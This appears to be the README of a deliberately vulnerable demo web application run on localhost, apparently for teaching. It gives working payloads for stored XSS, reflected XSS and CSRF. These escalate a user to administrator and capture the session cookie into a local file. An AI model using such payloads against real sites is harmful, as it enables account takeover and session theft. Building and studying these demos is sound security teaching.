##Starting xs_demo

Please note: Maven is required to use this software.

* Go to the app folder and run the Maven Jetty Plugin by using the following command: `$ mvn jetty:run`
* Deployed URL: `http://localhost:8080/`
* To stop the running Jetty server: `$ Ctrl + C`

##Persistent XSS

* Log in as standard user (username: user, password: user) and go to the **Edit User** dialog
* Copy the following script and paste it to the field **Additional Info**
* `<script>$.post( "http://localhost:8080/user_edit", { username: "user", password: "user", password2: "user", email: "user@web.de", newUser: "false", vip: "true" } )</script>`

* Log in as admin (username: admin, password: admin) and got to the **User List** dialog. The script above will be executed now sending a post request to the server and gives admin rights to the user.

##Non-persistent XSS

* As admin open the following link
* `http://localhost:8080/home?q=%3Cscript%3E$.get%28%22http://localhost:8080/save%22,%20{%20in:%20document.cookie%20}%29%3C/script%3E`
* The cookie of the current session will be written in the file **buffer.txt** that is located in the app folder

##CSRF

* As admin open the following static html page
* `http://localhost:8080/static/csrf_example.html`
* The script that will be executed after the image on the page is loaded is the same script like in the persistent xss example. This will give admin rights to the standard user again.
